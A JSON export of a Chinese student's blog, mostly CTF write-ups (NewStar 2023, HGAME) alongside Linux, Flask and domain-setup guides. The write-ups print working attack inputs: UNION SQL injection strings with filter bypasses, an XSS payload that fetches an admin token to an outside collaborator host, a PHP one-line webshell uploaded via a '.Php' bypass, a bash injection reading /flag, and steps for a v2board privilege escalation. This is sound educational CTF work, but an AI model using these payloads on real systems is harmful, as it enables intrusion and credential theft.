[{"title":"NewStar2023 Week3 web writeup by ripple","date":"2023-10-18T16:00:00.000Z","url":"/2023/10/19/NewStar2023-Week3-Web/","categories":[["CTF","/categories/CTF/"],["match","/categories/CTF/match/"]],"content":"NewStar2023 Week3 web writeup by ripple平台： 官方WP：NewStarCTF 2023 Week3 官方WriteUp (shimo.im) 听同学推荐这个比赛，说题目不错，试做了一下Week3的Web，确实很有意思，也有收获，写一下WP记录： WebInclude 🍐LFI to RCE，文件包含漏洞 但是常用的PHP伪协议等均被过滤，怎么办呢？ 这里我们注意到题目名称是：Include 🍐 🍐的英文是Pear，这下就了解到全新思路了。 在网上查到了P牛等大佬的文章： Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com) 关于利用pearcmd进行文件包含的一些总结 | W4rsp1t3’s blog 在这些文章中利用IFI写入木马或者phpinfo到/tmp目录下做演示，而本题/tmp目录似乎是无法访问的，后来换到/var/www/html就通了 而且本题是默认加了.php后缀，所以pearcmd就行，不应该pearcmd.php。 构造payload： 连接shell: 拿下flag: POP GadgetPHP反序列化的题目 开始比较混乱后来理了一下各种魔术方法逻辑就清晰了: 直接能出发的只有__destruct，然后传入的被当成字符串____toString，接着__invoke，PHP没有getStr方法所以是__call，最后通过__unset中的内容和PHP可变函数实现RCE 这里在本地写了一个脚本：为了写入变量的值，把Then类中func变量Handle、Super里面的obj变量改为public，但是生成的payload依旧能够直接打通，神奇。 我这样的写法是逆推回去的写法，后来室友阿菇写了一个和我本质一样的脚本，但他的方式是正向推的，比较好理解也值得学习，所以我也向他要了一份他写的脚本： 最终payload: burpsuite里面POST一下就行了 GenShin网页提示：Oh!try to find some information that is useful~ 在响应头发现有用的信息： 访问 /secr3tofpop路由 提示：please give a name by get get传参一个name，发现我们的name被显示在了页面： 有此可以猜测到是一个模板注入的漏洞，构造name=49，发现被过滤： 更坚定了SSTI的想法，以及可能是Jinja2的模板注入。 被过滤的： 等等 使用&#123;%7*7%&#125;是发现回显报错：确认是Jinja2的模板 然后就是各种绕过了。使用&#123;%print()%&#125;来绕过&#123;&#123;&#125;&#125; &#123;%print(7*7)%&#125;回显49 &#123;%print([].__class__.__base__.__subclasses__())%&#125;查看所有类 &#123;%print([].__class__.__base__.__subclasses__()[1])%&#125;查询类，方便爆破写脚本，然后就是找可用的类了 参考了这篇文章，写的真的很全面：奇安信攻防社区-flask SSTI学习与总结 最终payload: 当时就做了这么多了，未来可能再去做一下写一些记录，具体其他题目可以去看看官方WP"},{"title":"为博客设置个人域名","date":"2023-09-20T16:00:00.000Z","url":"/2023/09/21/blog_demain_deploy/","categories":[["blog","/categories/blog/"]],"content":"为博客设置个人域名最近买了一个域名，发现域名好贵啊QAQ，顺便就把博客放在这个域名下了，记录一下过程与遇到的问题。 主要参考的文章是：hexo史上最全搭建教程 1.购买域名想要为你的博客设置个人域名，首先你要有一个域名（废话）。可以在腾讯云或者阿里云等平台上买，我这里是在阿里云上面买的域名。所以以阿里云为例：阿里云域名购买入口(阿里云打钱) 查询你喜欢的域名购买即可~ .top比较便宜，一般情况下域名越长越无规律越便宜 2.进行实名认证根据相关法规，必须先实名认证之后才可以使用域名和DNS解析，一开始我就是因为未实名所以一直无法访问到，排除半天问题才发现是实名的问题，所以建议在购买域名之后直接实名，实名审核也需要一定的时间。 在阿里云右上角控制台进入后，在概览-我的资源-域名进入域名控制台，再右上角进入域名解析管理。 这里面如果实名不通过的话会有提醒，进入按照步骤来就行了，要先填一个模板，模板要上传身份证的，可以提前拍个照先，模板审核通过之后，选择模板上传等待审核通过就行了。模板审核比较久一些，后面的审核比较快。 3.添加DNS解析在阿里云右上角控制台进入后，在概览-我的资源-域名进入域名控制台，再右上角进入域名解析管理，然后点击你购买的那个域名。 右上角添加记录，设置如下： rippleqaq.top是我的域名，这里要换成你的~ 192.30.252.153 和 192.30.252.154 是GitHub的服务器地址 然后在github上找到你博客的库：yourname.github.io，进入这个库的settings，右边栏找到Pages-Custom Demain，写入你的域名（我是rippleqaq.top）后点击Save。 最后，在你的博客文件夹下source文件夹中添加一个没有后缀的文件CNAME，里面的内容是你的域名，你可以先创建一个.txt文件，输入你的域名之后删掉.txt后缀即可。如图： 接着就是经典三件套： 部署之后一段时间就可以通过你的域名来访问你的博客了~ 如果一直没有，也可能是缓存的问题，可以清除浏览器缓存之后刷新页面试试，之前我遇到过这个情况。"},{"title":"flask路由与视图映射与传参规则","date":"2023-04-03T16:00:00.000Z","url":"/2023/04/04/flask_variable/","categories":[["flask","/categories/flask/"]],"content":"一、路由与视图映射使用 route()装饰器来把函数绑定到 URL: 二、传参规则摘自flask中文文档： 通过把 URL 的一部分标记为 就可以在 URL 中添加变量。标记的 部分会作为关键字参数传递给函数。通过使用 converter:variable_name&gt;，可以选择性的加上一个转换器，为变量指定类型，记得函数中也要传参。请看下面的例子: 其中：escape函数是为了防止用户传入恶意的数据 转换器类型： string （缺省值） 接受任何不包含斜杠的文本 int 接受正整数 float 接受正浮点数 path 类似 string ，但可以包含斜杠 uuid 接受 UUID 字符串 三、GET方式传参使用 导入相应库 用接受request.args.get(self,key,default,type) key为变量名,default为默认访问页面时的传参值,type指定类型 例如： "},{"title":"HGAME 2022 FINAL writeup by ripple","date":"2023-03-10T16:00:00.000Z","url":"/2023/03/11/HGAME-Final/","categories":[["CTF","/categories/CTF/"],["match","/categories/CTF/match/"]],"content":"HGAME 2022 FINAL writeup by ripple[TOC] MISC锟斤拷一开始题目有问题，后来重新上线后用原来的方法做就行了。 下载打开附件1.cpp 得到一句注释： 结尾有等号，猜测为base64，解码得： 是乱码，但是结合题目：锟斤拷，可以猜到有编码问题。 “锟斤拷” 的成因是 Unicode 的替换字符（Replacement Character，�）于 UTF-8 编码下的结果 EF BF BD 重复，在 GBK 编码中被解释为汉字 “锟斤拷”（EF BF BD EF BF BD）。因此对字符串使用 GBK 编码，并以 UTF-8 解释即可。（也就是逆着进行锟斤拷的操作） （此段参考了SpiritCTF 2020 – Misc Official Writeup | KAAAsS’s blog中锟斤拷一题题解） 使用CyberChef得到全角的flag： 再把全角的flag转成半角即可：在线全角转半角网站 得到flag:hgame{utf-8&amp;gbk_is_a_easy_encoding_problem} WebFinal Flask根据题目描述： A small website writen by python flask Try to find the flag with your template injection! 可以猜测是Jinja2模板注入的题目 一开始想先找到所需的类的位置在去注入，写脚本一直出不来。 后来在学长的提醒下发现方向错了，由于网站在出现错误时返回的是500状态码，而如果找到对的位置肯定是正常返回，所以可以直接爆破。 用burpsuite开拦截随便输入一些后submit抓包再send to Intruder 构造的payload是： simple list从0到199爆破，筛选出200的状态码得到： 看来103、104、105、106都行，返回的是hgame2023，是whoami的执行结果，很对。 那接下来就可以为所欲为了 构造payload: 返回： 看到flag了，直接cat发现无回显。 源代码里有提示hint.txt，这里我们也发现了这个文件，于是我们先去看看hint.txt是什么 回显： 那就直接运行/readflag试试看: 得到flag: flag: hgame{Temp1ate_1njecti0n_seE_yoU_NeXt_tIMe}"},{"title":"linux内基本环境搭建","date":"2023-03-08T16:00:00.000Z","url":"/2023/03/09/build_environment/","categories":[["linux","/categories/linux/"]],"content":"Web方向的环境搭建按照协会的流程尝试在ubuntu中搭建一些常用的环境:  1.Python开发环境配置由于linux自带了python，不用像windows那样配环境，所以打算直接装了pycharm。 参考教程： 命令行执行 顺便装了一下VScode 参考了： 2.Node.js参考教程： 3.PHP 大受震撼，太方便了，一句话解决了，当时windows配置PHP老烦了。 顺便搞下PHPStorm: 下载PhpStorm 在JetBrains官网上下载PhpStorm的Linux版本： 解压缩PhpStorm 在终端中切换到下载目录，解压缩下载的PhpStorm文件。例如： 安装PhpStorm 将解压缩后的PhpStorm文件夹移动到/opt目录下: 运行在bin目录下运行./phpstorm.sh即可打开。 通行证这个没办法，还是要找网上办法。 4.MySQL问了chatGPT： 果然没有那么一帆风顺，在执行sudo mysql_secure_installation时，配置密码报错： 解决方案：  5.Java环境配置 （我在装jdk时好像顺便也装了jre，在执行最后一句时发现装了，真方便😍） JRE是什么？好室友给我推了这篇文章：  JDK是一个软件开发工具包，而JRE是一个允许Java程序运行的软件包 6.GO环境配置 一句话就好了也太爽了吧。 7. LAMP环境配置 感受到了linux下装环境的快感。"},{"title":"双系统的安装，hello linux","date":"2023-02-25T16:00:00.000Z","url":"/2023/02/26/hello_ubuntu/","categories":[["linux","/categories/linux/"]],"content":"安装双系统终于下定决心换一个系统，舍不得之前windows的东西，正好之前加装了一块硬盘，分出了150G装一个双系统。 简单写一下遇到的问题与解决。 主要参考了网站。 是用的华硕天选2笔记本，原装系统是windows11。 需要准备一个大于 2G 的 U 盘 。(提前备份，要格式化) 1.下载映像文件用镜像站下载会比较快，当时用的是清华源 点击获取下载链接，选择你要下载的镜像文件 我选择装的系统是ubuntu的22.04.2 (amd64, Desktop LiveDVD） 找到对应的下载即可。 2.刻录软件我是采用了rufus来刻录，网站是 插入你的U盘，格式化。 打开这个软件，选择下载的映像文件，开始刻录，我其他都是默认来的。 刻录需要等待一段时间。 3.关闭bitlocker安装时候遇见的第一个问题，一开始没关后面无法安装。 我一开始是开着的。 关闭方法： 打开设置-隐私和安全性-设备加密 关闭设备加密（这里解密要一段时间的） 4.创建空白磁盘分区右键此电脑，显示更多选项-管理-磁盘管理 就可以看到你的磁盘了，在这里其实可以看到磁盘是否被bitlocker加密，如果有的话请先解密。 选择最后一个磁盘空间的磁盘，比如 CD两个盘的最后一个盘是D盘（CDE盘的最后一个E盘，CDEF盘的最后一个盘F盘，以此类推），右键点击该磁盘，选择压缩卷。 选择你要压缩的量。 这里决定你另一个系统所能用的空间。 保证最后一个盘有40~50G的空余空间吧，或者如果你空间足够，强烈建议60、80、100或120等大一点更好。 我是分了150G（这样很大很爽） 压缩就OK了 5.进入bios插上你的U盘，关机后开机。进入bios 这个不同电脑可能不一样，华硕是在开机时按F2进入 （提一嘴华硕的bios界面真的帅 先关掉secure boot 华硕是advanced mode-security-secure boot-secure boot enabled -&gt;disabled 关secure boot上面那个。 然后返回主界面，将windows和你的另一个系统位置互换一下。 最后点save &amp; exit就行了（不同电脑可能不同） 这时候就会进入安装引导。 6.安装ubuntu其他的默认就行，时区上海。 但注意！！！下面做不好可能你会失去原系统 在提示：这台计算机似乎没有安装操作系统，你准备怎么做的时候 选择：其他选项（英语：something else） 找到里面会有一个空闲分区（free），大小和我们之前分的差不多，也就是我们之前所创建的那个分区。 右键手动分区。 linux分区也很有说法的，可以网上查一下推荐的分区方式。 这里参考那个网站： 我是分了200M的EFI，8Gswap，40G/，剩下全给了/home。 然后继续安装就行了。 最后成功搞定双系统。 [2023.7.26更新]我这个分法有点问题40G给/还是太少了，后来直接装了很多应用在/opt满了然后系统烂了，索性格式化了，东西没掉了，从0开始QAQ，大家请根据自己具体需要来分空间！ 这次分200M的EFI，8Gswap，100G/，剩下的给/home，QAQ。 哦对了，还有一件事～ 就是装完双系统后时间错乱的问题，装完ubuntu后我怀着紧张的心情进入bios调整位置回到原来的windows，希望不要出现什么大问题。 最后windows可以正常使用，但是时间往后走了8个小时。这个是很小的问题，进设置-时间和语言-日期和时间-立即同步就行了。 linux完全不会啊啊啊。开始摸索。"},{"title":"HGAME 2022 Week2 writeup by ripple","date":"2023-02-23T16:00:00.000Z","url":"/2023/02/24/HGAME-Week2/","categories":[["CTF","/categories/CTF/"],["match","/categories/CTF/match/"]],"content":"HGAME 2022 Week2 writeup by rippleREVERSEmath比较有意思的一道线性代数题（bushi 下载附件，放入IDA反汇编。 看到scanf，输入的变量我重命名了一下： 核心加密逻辑： 到这里一开始很奇怪，找不到savedreg和input之间的关系啊。 后来结合猜测与调试的验证，其实savedreg就是input。 用IDA远程连接虚拟机进行调试，具体参考了IDA动态调试ELF-软件逆向。 打断点后先随便输入了一下hgame{123123131312} 然后开始调试，找到savedreg的地址0x00007FFEA552F590，结合加密函数逻辑，减去0x170得到新地址：0x7ffea552f420 找到新地址的位置：0x7ffea552f420 发现正是我们input所在的位置！ 所以大胆猜测savedreg就是input。 后面的判断是v11要等于v12。 看加密过程，很像（就是）矩阵乘法啊！照应标题。 下面简单推导，v12、input、v10均为五阶矩阵。 v12 = input × v10 input =v12 × v10^(-1) input就是我们的flag。 后面就是解密了，我是采用了一个在线算矩阵的网站：矩阵计算器 最后的结果是： 但显然存在精度的问题，所以用python代码进行了矫正，代码如下： 得到flag:hgame{y0ur_m@th_1s_gO0d} WEBGit Leakage由题目不难猜出是一个git泄露的题 访问/.git发现确实有git泄露 使用GitHack-master 得到一个Th1s_1s-flag文件。 16进制编译器打开得到flag:hgame{Don’t^put*Git-in_web_directory} v2board顺着搜索v2board我们可以发现v2board1.6.1版本存在提权漏洞。 这个漏洞还是比较新的，复现难度也不高，太恐怖啦！尤其是自己复现一遍之后，真切感受到了网络安全的重要啊。 复现思路参考网站：v2board越权漏洞复现 先注册一个普通用户的账号 然后登陆，登陆后使用F12可以查看到返回头里的authorization 记录下authorization的值，退出登录，打开burpsuite开启拦截。 输入账号密码登录，burpsuite拦截到请求头。 向请求头里加入authorization头发送 这一步的目的是让服务器将普通用户的Authorization头写入缓存中。 关闭拦截，成功登录。 最后只要带上这个Authorization头即可访问所有的管理员接口。 开启拦截，带上Authorization头访问/api/v1/admin/user/fetch后关闭拦截。 进入到/api/v1/admin/user/fetch即可找到admin的token:39d580e71705f6abac9a414def74c466 用hgame包裹即是flag:hgame{39d580e71705f6abac9a414def74c466} Commodity 一开始是这样一个登录的界面。 题目的描述里面有提示：面板登陆用户名是user01,密码……忘了，反正是个比较好猜的密码，我记得它是8位数的，有字母也有数字 可见是一个8位弱密码的爆破。 这里可以在网上找一些字典来爆破，也可以直接试一些常见的8位弱密码。 我这里是查了一下然后试出来了，密码是admin123。 登录后进入这样一个界面： 输入1~8可以查看对应的一些商品： 猜测是SQL注入。 使用burpsuite发现是用POST方法传参，参数名是search_id。 后面为了方便F12使用hackbar来进行POST传参。 首先判断后端闭合方式： 输入1%23返回hard disk 1 输入’1’%23返回hard disk 1 输入1’%23返回报错 输入1’)%23返回报错 判断后端闭合符为数字型。 后端有一些字符被过滤了，测试过程就不一一说明了，下面是我payload里采用绕过方法： or and from where：双写绕过 database() select union :大写绕过 *空格：/1*/绕过 = : like绕过 有些既可以双写也可以大写绕过就不细说了。 采用的是联合注入: 第一步：判断查询结果有多少列 1/*1*/oorrder/*1*/by/*1*/3 :正常回显（order里包含了or，采用双写绕过） 1/*1*/oorrder/*1*/by/*1*/4 :错误回显 说明有三列。 第二步：显示数据库名 -1/*1*/Union/*1*/Select/*1*/1,Database(),3 第三步：显示se4rch数据库中的表名 -1/*1*/Union/*1*/Select/*1*/1,(Select/*1*/group_concat(table_name)/*1*/frfromom/*1*/infoorrmation_schema.tables/*1*/whwhereere/*1*/table_schema/*1*/like/*1*/‘se4rch’),3 第四步：显示5ecret15here数据表中的列名 -1/*1*/Union/*1*/Select/*1*/1,(Select/*1*/group_concat(column_name)/*1*/frfromom/*1*/infoorrmation_schema.columns/*1*/whwhereere/*1*/table_schema/*1*/like/*1*/‘se4rch’/*1*/anandd/*1*/table_name/*1*/like/*1*/‘5ecret15here’),3 第五步：显示5ecret15here数据表中的f14gggg1shere -1/*1*/Union/*1*/Select/*1*/1,(Select/*1*/f14gggg1shere/*1*/frfromom/*1*/5ecret15here),3 flag:hgame{4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!} 从零开始的SQL注入生活，折磨一天多终于出了！QAQ Designer 下载附件是网站的源代码，查看 我们可以看到真正的flag被藏在admin用户的jwt里面，因此这道题目的就是窃取到admin用户的jwt。 打开网站随便输入一个用户名注册先看看有什么漏洞。 在不同输入框里输入后preview我们会发现在Box shadow一栏里存在XSS注入漏洞 如图，我们的输入被嵌在了style中。 再次查看源代码，发现过滤名单： 这里是直接把输入清空了，所以不能双写绕过，大小写试了试也不行，找了很多方法，最后采用的是unicode转码绕过。（在线转unicode网站） 同时找到让前后闭合的方式 ： 3px 3px #000;”/a&gt; &lt;a” 最后点preview，发现这样可以成功弹窗： 3px 3px #000;”/a&gt;&lt;script&gt;\\u0061lert(“XSS-test”);&lt;/script&gt;&lt;a” 再去源代码看看存jwt的字段是什么： 是叫token localStorage被过滤，我们可以用unicode绕过： 3px 3px #000;”/a&gt;&lt;script&gt;\\u0061lert(\\u006cocalStorage.getItem(‘token’));&lt;/script&gt;&lt;a” 点preview测试一下。 成功弹出了自己的token。 这里我们的token里面有一个假的flag。 接下来就是要想办法让admin在浏览我们的按钮时把自己的token发过来。 用到了Burpsuite的Burp Collaborator client。 由于fetch被过滤，转码了一下 一开始我用的payload是： 3px 3px #000;”/a&gt;&lt;script&gt;\\u0066etch(‘;,{method:&#39;post&#39;,body:\\u006cocalStorage.getItem(&#39;token&#39;)});\\&lt;a” 结果发现存在问题，就是自己preview的时候，能收到自己的token，但是点share时,admin发看来的头里没有带token。 下面是admin的返回，无token: 后来才知道是自己没看源码，我们要先知道admin在访问链接时做了什么，才能找到正确的方法。 在源代码中找到我们点share后发生的事： 可以看到admin是先访问了  这一个有我们恶意代码的页面，再登录，后面进行了一次点击。 而我们的注入在第一步渲染按钮页面时就已经生效，这时候admin还没登录，不带有token，自然返回里没有token咯。 由此，我们的一种思路是在admin点按钮时去执行恶意代码，正好可以添加一个”href”的属性。 最终payload: 3px 3px #000;”href=”javascript:\\u0066etch(‘;,{method:&#39;post&#39;,body:\\u006cocalStorage.getItem(&#39;token&#39;)})&quot;a=&quot; preview测试时就是一点击就会返回。 然后share给admin点点。 成功返回admin的token 最后去在线网站解析一下： 得到真正的flag:hgame{b_c4re_ab0ut_prop3rt1ty_injEctiOn} 还有一种思路是csrf(客户端请求伪造），也值得一试。 MISCTetris Master RevengeTetris Master由于存在非预期解，修正后降了分数改为Tetris Master Revenge，所以这题的方法也可以兼容Tetris Master，在Tetris Master题解中展示非预期解。 根据提示：调小终端字体大小后用 ssh &#99;&#116;&#102;&#64;&#x77;&#101;&#x65;&#x6b;&#x2d;&#50;&#x2e;&#104;&#103;&#97;&#109;&#x65;&#x2e;&#x6c;&#119;&#115;&#x65;&#99;&#46;&#x63;&#110; -p 端口号 连接，密码为hgame 下载附件得到源码，查看源码后找到提示： 看来是要在这里输入一些东西让利用master执行我们想要的代码。 在paint_game_over()函数中找到关键： if [[ “$master” -eq “y” ]] &amp;&amp; [[ “$score” -gt 50000 ]]; then elif [[ “$master” -ne “y” ]] &amp;&amp; [[ “$score” -gt “$target” ]]; then 这是条件表达式，可以发现如果输入y后获得50000分理论也可取得flag，但并不推荐这样做。 条件表达式中由于使用了[[和gt，使其仍然能够加载表达式。 于是我们可以在询问Are you tetris master?[y/n]后输入： x[$(cat /flag)] Please input your target score:时随便输入一下。 然后快速输掉游戏就可以得到flag了！ flag:hgame{Bash_Game^Also*Can#Rce^reVenge!!!!} Tetris Master用Tetris Master Revenge的方法也能解，下面展示非预期： 在询问Are you tetris master?[y/n]时直接ctrl+C退出 发现ssh连接还未断开。 再cat flag就行了 flag:hgame{Bash_Game^Also*Can#Rce} Sign In Pro Max超级签到题 下载附件signin.txt： 第一部分是base系列加密，用CyberChef点魔术棒解决： 2、3、4部分是md5的爆破，采用网站md5在线加密解密注册登录后查询（题目里这些值可以用这个免费查到）： 附上其他的网站（一些值需付费） Cmd5 - MD5 Online ,MD5 Decryption, MD5 Hash Decoder md5解密 MD5在线解密 破解md5 (pmd5.com) md5在线解密 在线加密 (ttmd5.com) 分别得到：f91c 4952 a3ed 最后那一串我们可以看到相同位置有个5存在，后面还有标点，猜测位一句加密过的话，位置不变的话想到凯撒密码。 采用在线网站，位移5位时成功得到明文： Part5 is 0bc0ea61d21c, now put all the parts together, don’t forget the format. 至此5个部分全部得出，但组合时别忘记格式（uuid） 最终flag:hgame{f51d3a18-f91c-4952-a3ed-0bc0ea61d21c} CRYPTORabin题目即是考点，Rabin密码体制是对e=2的RSA的一种修正。 题目给出了p、q、c，足以解密。 解密脚本参考自 脚本为： 得到flag:hgame{That‘5_s0_3asy_to_s@lve_r@bin} RSA 大冒险14个不同有漏洞RSA加密组合题 远程连接一下就可以得到密文和公钥 具体的对应可以在相应的py文件中查看 challege1是用了三个素数，先除掉一个r后得到p*q(也就是n) 我得到的n是180326030445057103882510226931211081193929158820681452896727282807017 已经比较小了，用在线网站直接分解（所用网站：分解素因数工具 - 整数分解最多为70位 ） 写脚本decode1.py: 得到challenge1答案：m&lt;n_But_also_m&lt;p challenge2在代码中我们可以发现每次加密后只换了q，p、e一直都不变。明文显然也不变。 那我们只需要得到两组n，求这两个n的最大公约数即为p，再求q就行了。 解密脚本decode2.py: 得到challenge2答案：make_all_modulus_independent challenge3在代码中我们可以看见e = 3，指数e太小了，采用低加密指数攻击 这个脚本参考了网站 decode3.py: 得到challenge3答案：encrypt_exponent_should_be_bigger challenge4代码中我们发现每次加密都只换了一个e，p、q、n均不变 考虑获得两组数据后共模攻击。 脚本参考了网站共模攻击部分 decode4.py: 得到challenge4答案：never_uese_same_modulus 最后在各个部分check，分数到达4后得到flag: hgame{W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA} 第二周折磨结束了，三天喘喘。收获很多，学到新知识了。QAQ 路漫漫~"},{"title":"HGAME 2022 Week1 writeup by ripple","date":"2023-02-07T16:00:00.000Z","url":"/2023/02/08/HGAME-Week1/","categories":[["CTF","/categories/CTF/"],["match","/categories/CTF/match/"]],"content":"HGAME 2022 Week1 writeup by rippleREVERSE初学逆向QAQ里面的代码不是很好，这次学到了很多新东东。 test your IDAIDA测试，把程序放入IDA反汇编F5查看伪代码即可得到结果。 flag:hgame{te5t_y0ur_IDA} easyasm汇编真是一点不懂啊，这题其实是摸出来的QAQ。 附件是txt文件，里面是汇编代码，读程序。 一开始还是想正经挑战的，看《汇编语言》看到mov那吧，再看看这个，还是一脸懵逼。 于是就开始摸了。 总之就是看到这一行： 想着既然给的是汇编，程序应该不会太复杂，于是就试了试异或0x33回去看看，没想到摸对了。 附上解密代码： flag:hgame{welc0me_t0_re_wor1d!} easyenc拖到IDA中查看 主要加密函数： 异或0x32后减去86，逆过来就是先加86然后异或0x32。 然后找到密文是v7[10]数组和v8，这里一开始不明白怎么成int了，后来了解到是编译优化，编译后为了加快数据的初始化速度就4字节一初始化，原来v7是个char数组。 可以试试对着v7后面的数据及v8按H变成16进制就一目了然了。 我这里麻烦了，其实小段存进去v7已经排好了，代码如下： flag:hgame{4ddit1on_is_a_rever5ible_0peration} a_cup_of_tea考察TEA加密算法 关键是找到delta,key,密文 这里的密文很好得出，就是Buf2，由于是编译优化（编译后为了加快数据的初始化速度就4字节一初始化），我这里依然是用了不太好的方法，算法有待改进。 看得出来sub_7FF7EDDD10B4是TEA的加密函数，进入找到v3 -= 0x543210DD，但这里要注意delta不是0x543210DD，因为TEA加密是无符号整型+=delta，所以这里的delta是-0x543210DD所对应的无符号整型。 key我是通过调试找到的，在加密函数内打断点看v2、v4、v5、v6记下来。 其实也可以直接找到xmmword_7FF7EDDD22B0提取 然后就是解密了。 一开始蠢了看到这+2真的自己加2了 input被转成了unsigned int*，每次加减1相当于加减4字节。所以其实是8。 而且更重要是tea加密单次加密8字节，逆向要充分遵照原文，加密怎么加密的就怎么解密，1个字节都不能差。 最后附上有待优化的代码： flag:hgame{Tea_15_4_v3ry_h3a1thy_drlnk} encodedie查壳是32位 用32位IDA打开 分析加密的过程: v4是密文，偶数位存的是左四位二进制的值，奇数位存的是右四位二进制的值。 dword_403000是密文，进入后shift+8设为数组，shift+E提取。 发现识别为了char。 我这里比较手动，把多余的0x00替换掉了之后再放入。 以及后面的flag也是自己一个一个输入，中间还出错了，总之非常人工，又慢又不准确。 后来才知道可以用移位操作符QAQ。 总之别看我这的代码了，看别人的吧，丢人。 flag:hgame{encode_is_easy_for_a_reverse_engineer} WEBClassic Childhood Game经典魔塔，interesting，但我不太会玩哈哈哈哈哈。 之前有段时间热衷于魔塔，有个玩h5魔塔的网站分享一下：HTML5魔塔广场 (h5mota.com) 言归正传，用F12查看源代码的时候发现/Res路径 访问/Res路径发现是一个资源索引 里面存在js代码的泄露 逐个查看，可以在events.js文件里发现不对劲，发现mota()函数 了解到代码被混淆过，可读性较差。 一开始蠢蠢的去找了一个在线运行js代码的网站把mota{}去掉运行出来找到了flag(这个网站好像还可以解密混淆过的js代码，总之先贴一下) 后来才知道原来可以F12在控制台直接运行QAQ flag:hgame{fUnnyJavascript&amp;FunnyM0taG4me} 看了源代码里的内容，感觉里面有好多彩蛋嘿嘿。 Become A Member由题目描述可知是一个HTTP请求头的题目。 一开始乱玩访问/flag没想到找到一个假flag哈哈哈哈哈，这都能被预判吗。 用BurpSuite拦截后抓包，右键send to repeater。 第一个提示是：请先提供一下身份证明（Cute-Bunny）哦 查了一下最后发现是User-Agent: 改User-Agent为Cute-Bunny后send 得到第二个提示：每一个能够成为会员的顾客们都应该持有名为Vidar的邀请码（code） 从返回头中我们能看到给了一个cookie里是code 不难想到添加Cookie 添加Cookie: code=Vidar后send 得到第三个提示：由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请 显然是用Referer头来修改请求来源 添加Referer: bunnybunnybunny.com后send 得到第四个提示：就差最后一个本地的请求，就能拿到会员账号啦 本地请求这里可以用X-Forwarded-For伪造本地访问 添加X-Forwarded-For: 127.0.0.1后send 得到第五个提示：username:luckytoday password:happy123（请以json请求方式登陆） 在这里卡了好久，去了解了json格式之后以为只能用POST方法传，后来才知道是可以用GET方法传json格式数据，同时还要注意这里值都是字符串！ 在最后空一行后添加： {“username”:”luckytoday”,”password”:”happy123”} 然后send 得到flag:hgame{H0w_ArE_Y0u_T0day?} 最后附上完整报文： Guess Who I Am一只不会写脚本的菜狗路过QAQ 题目提示写个脚本帮助兔兔，可是我不会啊QAQ 只能自己亲自来一个个帮兔兔答了QAQ 网站F12查看源代码发现提示： 访问后其实就是问题的答案 因为不会脚本就保存到记事本里查找复制粘贴了QAQ 还好学长亚萨西，只是100个，来个1000甚至10000个就很难受了QAQ 附上即将成功的画面QAQ： 最后flag是：hgame{Guess_who_i_am^Happy_Crawler} 认识了学长学姐，这波赚了( Show Me Your Beauty第一次做文件上传题，下中国蚁剑弄了半天，写个一句话木马windows直接报毒删了233 后来下了火绒来查毒就OK了。成功后现在看到一个网站能传文件就想传个木马试试了（×bushi 总之在过程中学到了许多。 网站可以上传图片格式的文件。 写了一个一句话木马1.php：&lt;?php@eval($_POST[“cmd”]);?&gt;很经典 然后将后缀改为.jpg格式 打开BurpSuite拦截请求后上传文件1.jpg点submit后BurpSuite就会拦截到请求头 将其中的Content-Disposition里的filename从1.jpg改为1.Php(注意有一个大写) 一开始是改为1.php提示类型不匹配，应该是将.php后缀禁了，于是换成了.Php 然后关闭拦截，提示上传成功且告知了位置 当我们访问/img/1.Php时是一个空白页面而不是404页面，说明木马已成功植入网站。 接着用蚁剑连接就行了。 在根目录下找到flag:hgame{Unsave_F1L5_SYS7em_UPL0ad!} MISCSign In签到题，base64解码得到flag:hgame{Welcome_To_HGAME2023!} Where am I是一个流量包文件，题目里的提示是上传了文件到网盘。 wireshark打开查找http，得到两个数据。 在其中一个找到rar文件。 导出数据，找到rar文件头和文件尾，用16进制编辑器手动分离一下，得到一个rar的压缩包，命名为1.rar 可以无脑binwalk分离出来rar，但我这样分离出来的文件尾是不对的，还要再分，不知道这样能不能继续进行。 总之是得到了一个rar文件，查看后提示文件头损坏并显示有加密。 于是猜测是rar的伪加密，可参考网站。 将第24位的数据从24改为20，重命名为11.rar，就可正常解压得到Exchangeable.jpg 题目是要找到拍摄的经纬度，右键查看Exchangeable.jpg的属性就行了 南纬北纬西经东经的话可以试一下也很方便。或者我们用PS来来看： PS打开Exchangeable.jpg，在文件-文件简介中查看。 这样就知道flag啦：hgame{116_24_1488_E_39_54_5418_N} 神秘的海报附件为png图片，是LSB隐写。用StegSolve打开Analyze-Data Extract中查看，颜色通道都选0。 保存一下，得到一半的flag:hgame{U_ Kn0w_LSB&amp;W 另一半的flag提示在 下载，是一首歌曲且用了Steghide加密，密码提示是一个六位整数。 下载得到Bossanova.wav 用Steghide解密，密码是最经典的123456，试一下就得到了（或者可以爆破？） 在同目录下找到flag2.txt得到另一半flag:av^Mp3_Stego} 总的flag:hgame{U_ Kn0w_LSB&amp;Wav^Mp3_Stego} e99p1ant_want_girlfriend茄皇NB，我要是女生我就冲了[doge]。 得到一张帅气的照片，题目提示CRC有问题，不难猜出是修改了宽高。 用脚本爆破出宽高（采用的脚本） 得到原宽高0x200 0x2c2 16进制编译器打开将00 00 02 A8 改为 00 00 02 C2后保存即可。 在图片下方得到flag:hgame{e99p1ant_want_a_girlfriend_qq_524306184} QQ直接加爆23333333 CRYPTORSA基本的RSA加密，已知e、n、c。 一开始用iroot开方求p、q发现不行。 后来才知道p、q差太大时时不能这么算的。 要利用网站进行n的分解。 分解网站：factordb.com 然后用脚本就行了。 代码： flag:hgame{factordb.com_is_strong!} 由答案也可以看出是考察利用网站来大数分解。 Be Stream原加密过程： 是一道算法优化的题目，折磨了几天做出来了。下提供两种做法： 1.改递归为循环，多取几次mod 严谨说明不是很会，总之就是取mod不影响结果，也可以感受一下。 2.斐波那契矩阵和矩阵快速幂 去网上查了查相关资料，学过线代知道矩阵后比较好理解。 学习参考矩阵快速幂求斐波那契数列。 算法改造自斐波那契第n项的几种解法以及tr0uble学长的指点。 这里就算一下初始的矩阵（一开始顺序反了导致错了QAQ） 按照自己理解写的，哪里不对请指出QAQ 代码： flag:hgame{1f_this_ch@l|eng3_take_y0u_to0_long_time?} 确实take了我三天QAQ。 神秘的电话考察古典加密 最后北欧神话有点难想到233 附加里是：encrypted_message.txt和morse.wav encrypted_message.txt是base64编码，解码得到重要信息： 